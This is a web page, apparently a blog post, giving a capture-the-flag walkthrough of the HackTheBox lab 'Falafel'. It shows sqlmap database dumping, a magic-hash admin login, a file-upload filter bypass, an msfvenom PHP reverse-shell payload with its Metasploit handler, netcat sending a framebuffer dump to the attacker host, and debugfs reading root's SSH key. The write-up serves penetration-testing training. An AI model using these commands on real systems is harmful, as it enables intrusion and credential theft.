@@ -1,0 +1,142 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Box Challenge: Falafel Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-falafel-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-07-14T06:33:58+00:00">July 14, 2018</time><time class="updated" datetime="2025-07-05T16:57:13+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this Post, we are going to solve another CTF challenge “falafel” which is available online for those who want to increase their skill in penetration testing and black box testing. Falafel is a retired vulnerable lab presented by hack the box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to expert level.</span></p>
+<p><span style="color: #000000;"><strong>Level:</strong> Hard</span></p>
+<p><span style="color: #000000;"><strong>Task:</strong> find user.txt &amp; root.txt file on the victim’s machine</span></p>
+<h3><span style="color: #800000;">Penetration Methodology </span></h3>
+<p><strong><span style="color: #000000;">Scanning</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Open ports and Running services (Nmap)</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Enumeration </span></strong></p>
+<ul>
+<li><span style="color: #000000;">Enumerating Web Directory (Dirbuster)</span></li>
+<li><span style="color: #000000;">Identify Web application vulnerability </span></li>
+<li><span style="color: #000000;">SQL Injection</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Exploiting Web Application Vulnerabilities </span></strong></p>
+<ul>
+<li><span style="color: #000000;">Login form SQL Injection</span></li>
+<li><span style="color: #000000;">File Upload </span></li>
+</ul>
+<p><strong><span style="color: #000000;">Spawning Shell</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Injecting PHP payload (Metasploit)</span></li>
+<li><span style="color: #000000;">Stealing SSH Credential</span></li>
+<li><span style="color: #000000;">SSH login</span></li>
+<li><span style="color: #000000;">Get user.txt</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong> </span></p>
+<ul>
+<li><span style="color: #000000;">Cracking Frame-buffer Device (Cyber Forensic)</span></li>
+<li><span style="color: #000000;">Escalated root shell</span></li>
+<li><span style="color: #000000;">Get root.txt</span></li>
+</ul>
+<p><span style="text-decoration: underline;"><strong>Walk-Through </strong></span></p>
+<h3><span style="color: #800000;">Scanning</span></h3>
+<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and its IP is 10.10.10.73 so let’s begin with nmap port enumeration.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap –A 10.10.10.73</pre>
+<p><span style="color: #000000;">From its scanning result, we found port 22 and 80 are open for ssh and http services.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-edCMjtpNHCQ/W0mS_VYTy1I/AAAAAAAAYBI/f1YdQ3MukUQUj6gj0y0AZLebYR-5sNRUgCEwYBhgL/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">So we explored target IP through the web browser and it put up a login page shown.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pH8YT6dA4XM/W0mTB_vZvaI/AAAAAAAAYBU/1KA0l03QFoU4vffZtrvFwyKvssxV5Ap8QCEwYBhgL/s1600/2.png"/></span></p>
+<h3><span style="color: #993300;">Enumeration </span></h3>
+<p><span style="color: #000000;">When I didn’t found any remarkable things then I used Dirbuster for directory brute force attack. It put up so many files but /cyberlaw.txt looks more interesting so I browsed http://10.10.10.73/cyber.txt and put a message in front of me.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-LG3Z6TRdiaE/W0mTDTpDZmI/AAAAAAAAYBE/jhF8GXeD6_MN1mK9A0h3q0465aJJoHoBACEwYBhgL/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">By reading this message, I conclude that there is <em>an</em> <em>admin accoun</em>t and which is facing major security issue and an attacker can easily take over the website using an image upload feature. Moreover, there is some hint on the URL filter.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-VaqKT0i5Qvw/W0mTDqEfgeI/AAAAAAAAYBM/1Fv8DGs3rv8QaeAfWDZQZwVezkHneddygCEwYBhgL/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Then we try SQL injection on the login form but it gave an error “<em>Wrong Identification: admin</em>”</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-kAsH711HZJo/W0mTD5_-7TI/AAAAAAAAYBU/VDSbdaA4QNEw-oW98xbtUaLfzvDuWAS9gCEwYBhgL/s1600/5.png"/></span></p>
+<h3><span style="color: #993300;">Exploiting Web Application Vulnerabilities </span></h3>
+<p><span style="color: #000000;">Then we make more efforts for SQL injection by using SQLMAP and used “Wrong identification” as a string to be passed at the time of login.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" --dbs --batch</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kAxDOV5HAqE/W0mTEBiJgjI/AAAAAAAAYBQ/fghTxSz65T82uqyRHrw_TlLXt3cvS64hgCEwYBhgL/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">As result, it dumps the database name “falafel” now let’s extract the whole database information.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ZTCUrhWxRgA/W0mTEL1VZ-I/AAAAAAAAYBM/DLW4NwlQ8QAw55dEy6yFv1psHksyK5mrwCEwYBhgL/s1600/7.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" -D falafel --tables --batch
+sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" -D falafel -T users --dump --batch</pre>
+<p><span style="color: #000000;">So we got users tables from inside it and it has username and password as shown.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_FPG3qF8G6k/W0mTERYqxtI/AAAAAAAAYBQ/ZQoUvV5z-VMVhzKIjgK4GAgyvcpouGnZQCEwYBhgL/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">As you can observe that the password hash for user admin is started with 0 and I don’t know much about this type of hash, so we look in the Google and notice<span style="color: #3366ff;"> link</span> for Magic hashes.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-35INwejhPNo/W0mTEieVJmI/AAAAAAAAYBU/7HN82r7mwlgKhEXFpvIqh_0HVpCVph9GgCEwYBhgL/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">As you can observe the highlighted md5 hash for the 32-bit string is same as above……………………….</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-E33w3gyZFIk/W0mS_cf40NI/AAAAAAAAYBU/gA-GMzax4eADX5ILzogHbAkFL2Ot9KnDACEwYBhgL/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">With help of the following credential we login into admin dashboard and move to upload options.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Username: admin
+Password: 240610708</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Xwl93Hse9jg/W0mS_WFSlzI/AAAAAAAAYA8/urLXzZwCz8ksghqGB2rOetjm8rHEOGd5QCEwYBhgL/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Here we are trying to upload a php file named shell.php but it put an error “Bad extension “as shown</span></p>
+<p><span style="color: #000000;">Thereafter we renamed it as <em>shell.php.png</em> and again try to upload.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-phTey0gmFvA/W0mS_zJw3TI/AAAAAAAAYBA/ELcBYDQp7Jc6na6Tni66_VGIv-6aKxNKACEwYBhgL/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Ohh! Yes, the file with <strong>.png</strong> extension get uploaded successfully inside <em>/var/www/html/uploads</em> hence we can to upload a malicious php file or any php backdoor with .png extension.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-P7EXSZXYw_Y/W0mS_0WKmmI/AAAAAAAAYBM/ZbA6gdgFj0YbFxtwvXWn2Z8BUyRn_g6pACEwYBhgL/s1600/14.png"/></span></p>
+<h3><span style="color: #993300;">Spawning Shell</span></h3>
+<p><span style="color: #000000;">Let’s create a PHP payload for uploading into the web site. We have to use the msfvenom command for generating PHP backdoor.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 -f raw</pre>
+<p><span style="color: #000000;">Now <strong>copy</strong> the code from <strong>*&lt;?php….die();</strong> and paste in a text file then as rajjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj.php.png </span><span style="color: #000000;"><strong>(240 character)</strong> also start multi handler in a new terminal.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lUIXpgJ0vzg/W0mS_w079bI/AAAAAAAAYBI/Ac6aeoHcim8usNIGn1amvuQ8YkfcVVBRwCEwYBhgL/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">Let me make it clear to you, here the author has applied filter for identifying  240 character file which means your file name must contain 240 characters including extension.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--qrUWSl8GDI/W0mTAuHRUKI/AAAAAAAAYBI/I_trvhkkAkUuAvud4L-SJKLGL-vdLr84QCEwYBhgL/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">As shown in the given image the PHP file is uploaded successfully inside <em>/var/www/html/uploads</em>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZG4IOh_-808/W0mTBJ0GZyI/AAAAAAAAYBE/jaGG-3kWmUsakaeYnekru03XBjMfSAFDgCEwYBhgL/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">Let execute it in the URL for obtaining reverse shell at Metasploit.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-2hiUhNEyKEY/W0mTBdg11mI/AAAAAAAAYBM/gXg0YjOf1VILKi_lYISsrkXuLJrrfimCACEwYBhgL/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 10.10.14.25
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit</pre>
+<p><span style="color: #000000;">From given below image you can observe <strong>Meterpreter session 1</strong>. But the task is not finished yet, still, we need to penetrate more for privilege escalation. Further, we open passwd file and notice two system username i.e. yossi and moshe.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter&gt; cat /etc/passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-CYG-f2w8KfU/W0mTBSb9fQI/AAAAAAAAYBU/qBwws8wpZWwsHdyt17VqpodCqotRkTRTwCEwYBhgL/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">After making some more inspection we found a file <strong>connection.php</strong> from inside <em>/var/www/html</em> and receive database credential from inside it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter&gt; cd /var/www/html
+meterpreter&gt; ls
+meterpreter&gt; cat /connection.php</pre>
+<p><span style="color: #000000;">This is MySQL configuration file for MySQL where username is <strong>moshe</strong> and password is <strong>falafelIsReallyTasty</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-dy80bNMzkgQ/W0mTB_JU-_I/AAAAAAAAYBQ/DcakMD-5_484Ity-uKq-7jfFC_vDlxb6wCEwYBhgL/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">With help of above credential we are trying to ssh login and after making successful login we found the user.txt file from inside /home/moshe</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh moshe@10.10.10.73
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+cd /home                                                             
+cd moshe
+cat user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SkE8n6dQ1UM/W0mTCEGmXVI/AAAAAAAAYBI/yAGjpX9W6UgSavwsloXjegCC9btXEXT8QCEwYBhgL/s1600/21.png"/></span></p>
+<h3><span style="color: #993300;">Privilege Escalation </span></h3>
+<p><span style="color: #000000;">After some more penetration, we enumerated the groups for user <strong>moshe</strong> and found that the user is in the <strong>video</strong> group. When we found uses as the member of the video group then for Privilege Escalation we need check frame-buffer device. Because this can lead a local user able to access a frame buffer device file (/dev/fb*) could possibly use this flaw to escalate their privileges on the system.</span></p>
+<p><span style="color: #000000;">Let’s have the contents of /dev/fb0 with help of cat command to capture the framebuffer raw data inside /tmp directory as scree.raw</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">groups
+cat /dev/fb0 &gt; /tmp/screen.raw
+cd /tmp
+ls
+nc 10.10.14.25 5555 &lt; screen.raw</pre>
+<p><span style="color: #000000;">So we have captured the raw data inside /tmp, now you need to take the raw image and convert it to a standard image format say .png but we before that we need to find t the size, use the following command which will print the dimension……………..</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /sys/class/graphics/fb0/virtual_size</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-GLUaG5hhlo8/W0mTCf6kuOI/AAAAAAAAYBE/UqJboIglMTMMXT3XX-C3Ulq9qqBl_iNegCEwYBhgL/s1600/22.png"/></span></p>
+<p><span style="color: #000000;">Now enter the following command to convert raw data into a .png image format</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./iraw2png.pl 1176 885 &lt; screen.raw &gt; screen.png</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-DX9Dy4miN6A/W0mTCv7RqBI/AAAAAAAAYBA/Ve0nQ-mpvgQqfZvv_-wXysvqORUIQSzoQCEwYBhgL/s1600/24.png"/></span></p>
+<p><span style="color: #000000;">Then we opened screen.png and got the following image which was showing password: <strong>MoshePlzStopHackingMe!</strong> for user <strong>Yossi</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-LSiG55BQOMA/W0mTClnFIhI/AAAAAAAAYBE/UEuDdptr5Pgk3ymEGY6afVtuwFURBl_YACEwYBhgL/s1600/25.png"/></span></p>
+<p><span style="color: #000000;">With help of above-enumerated credential, we have made SSH login successfully and then run following command for getting SSH RSA key.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">df
+debugfs /dev/sda1
+cat /root/.ssh/id_rsa</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bkVxzQt6h6s/W0mTDNRve5I/AAAAAAAAYBE/bCL03JMosJcQo6rcWKR-zxJV3kogmlbTACEwYBhgL/s1600/27.png"/></span></p>
+<p><span style="color: #000000;">Now copy the RSA key in a text file and named as key in your local machine. Also, give permission 600 to it. Then connect to ssh once again through above RSA file as given below:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i key root@10.10.10.73
+ls
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-L9wgH31Ftx8/W0mTDcPtRJI/AAAAAAAAYBI/f-9b5Os5CxwvdK5-Hw5O0ivzYkhawahqgCEwYBhgL/s1600/28.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
